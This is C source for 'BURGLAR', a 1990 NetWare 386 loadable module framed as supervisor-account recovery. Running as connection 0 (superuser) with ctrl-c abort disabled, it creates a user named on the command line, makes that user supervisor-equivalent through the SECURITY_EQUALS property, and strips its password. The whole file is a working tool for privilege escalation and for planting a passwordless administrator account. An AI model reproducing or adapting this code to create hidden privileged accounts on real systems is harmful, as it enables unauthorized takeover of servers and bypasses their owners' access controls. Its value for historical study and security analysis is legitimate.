/* BURGLAR - To recover the supervisor account of netware 386 

   (c) 1990 Cyco Automation, created by Bart Mellink.
            (My first NLM)

*/
#include <errno.h>
#include <fcntl.h>
#include <io.h>
#include <stddef.h>
#include <stdio.h>
#include <string.h>
#include <direct.h>
#include <nwtypes.h>
#include <nwbindry.h>
#include <dos.h>

main( int argc, char *argv[] ) {
	long task;
	char *name;

	printf("BURGLAR - Create supervisor equivalent user account\n" );
	printf("          (c) Cyco Automation (bm) 1990\n");

	task=SetCurrentTask(-1L);
	SetCurrentConnection(0);	/* set connection 0 -> superuser */
	SetCtrlCharCheckMode(0); 	/* No abort on ctrl-c */

	name=argv[1];

	if (argc>1) {
		/* First create an user object in the bindery */
		if (CreateBinderyObject(name,OT_USER,BF_STATIC,0x31)==0)
			printf("New user %s created\n",name);
		else
			printf("User %s allready exists\n",name);

		/* User object must have an equivalent property */
		CreateProperty(name,OT_USER,"SECURITY_EQUALS",BF_STATIC|BF_SET,0x32);

		/* Add supervisor equivalent to equivalence property */
		if (AddBinderyObjectToSet(name,OT_USER,"SECURITY_EQUALS","SUPERVISOR",OT_USER)==0)
			printf("User made supervisor equivalent\n");
		else
			printf("User was allready supervisor equivalent\n");
		
		/* Create password property and make empty string */
		if (ChangeBinderyObjectPassword(name,OT_USER,"","")==0)
			printf("Password removed from user\n");
		else {
			/* On error check if we had allready empty password */
			if (VerifyBinderyObjectPassword(name,OT_USER,"")==0)
				printf("Password was allready removed from user\n");
			else
				printf("Could not remove password from user\n");
		}
	}
	else {
		printf("          Error: Username missing from commandline\n");
	}

	ReturnBlockOfTasks(&task,1L);
	ReturnConnection( GetCurrentConnection() );
	return 0;
}
